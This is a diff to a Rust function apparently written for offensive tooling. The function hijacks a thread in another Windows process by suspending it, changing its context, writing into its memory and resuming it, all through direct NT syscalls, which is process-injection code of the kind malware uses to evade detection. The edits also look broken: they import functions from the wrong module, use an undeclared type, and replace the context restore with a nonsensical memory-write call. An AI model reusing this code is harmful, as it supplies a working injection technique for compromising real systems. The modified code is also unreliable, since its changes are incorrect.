@@ -1,25 +1,22 @@
 use std::ptr::null_mut;
 use winapi::um::winnt::{HANDLE, PVOID, SIZE_T, PAGE_READWRITE, ULONG};
-use winapi::um::winnt::CONTEXT_ALL;
-use winapi::um::processthreadsapi::CONTEXT;
+use winapi::um::processthreadsapi::{CONTEXT, NtResumeThread, NtSuspendThread};
 use winapi::um::memoryapi::WriteProcessMemory;
-use winapi::um::minwinbase::DWORD;
-use winapi::shared::minwindef::FALSE;
 use winapi::um::winnt::{NT_SUCCESS};
 use syscall::syscall;
 
 fn jmp_hijack_thread(h_thread: HANDLE, p_address: PVOID, h_process: HANDLE) -> Result<(), String> {
     // Suspend the thread
-    let status_suspend = unsafe { syscall!("NtSuspendThread", h_thread, null_mut::<ULONG>()) };
+    let status_suspend = unsafe { syscall!(NtSuspendThread, h_thread, null_mut::<ULONG>()) };
     if !NT_SUCCESS(status_suspend) {
         return Err(format!("[!] Failed to suspend thread with NTSTATUS: {:#X}", status_suspend));
     }
 
     // Get the current thread context
     let mut context: CONTEXT = unsafe { std::mem::zeroed() };
-    context.ContextFlags = CONTEXT_ALL;
+    context.ContextFlags = winapi::um::winnt::CONTEXT_ALL;
     let status_get_context = unsafe {
-        syscall!("NtGetContextThread", h_thread, &mut context as *mut _) // Get the current thread's context
+        syscall!(NtGetContextThread, h_thread, &mut context as *mut _)
     };
     if !NT_SUCCESS(status_get_context) {
         return Err(format!("[!] NtGetContextThread failed with NTSTATUS: {:#X}", status_get_context));
@@ -79,15 +76,12 @@ fn jmp_hijack_thread(h_thread: HANDLE, p_address: PVOID, h_process: HANDLE) -> R
     };
     if !NT_SUCCESS(status_write_memory) {
         // Restore the original context before returning
-        let _ = unsafe { syscall!("NtSetContextThread", h_thread, &original_context as *const _ as *mut CONTEXT) };
+        let _ = unsafe { syscall!(NtWriteVirtualMemory, h_process, &mut context as *mut _ as *mut _, &original_context as *const _ as *mut _, std::mem::size_of::<CONTEXT>() as SIZE_T, std::ptr::null_mut::<c_void>()) };
         return Err(format!("[!] NtWriteVirtualMemory failed with NTSTATUS: {:#X}", status_write_memory));
     }
 
-    // Restore the original context
-    let _ = unsafe { syscall!("NtSetContextThread", h_thread, &original_context as *const _ as *mut CONTEXT) };
-
     // Resume the suspended thread
-    let status_resume = unsafe { syscall!("NtResumeThread", h_thread, null_mut::<ULONG>()) };
+    let status_resume = unsafe { syscall!(NtResumeThread, h_thread, null_mut::<ULONG>()) };
     if !NT_SUCCESS(status_resume) {
         return Err(format!("[!] Failed to resume thread with NTSTATUS: {:#X}", status_resume));
     }
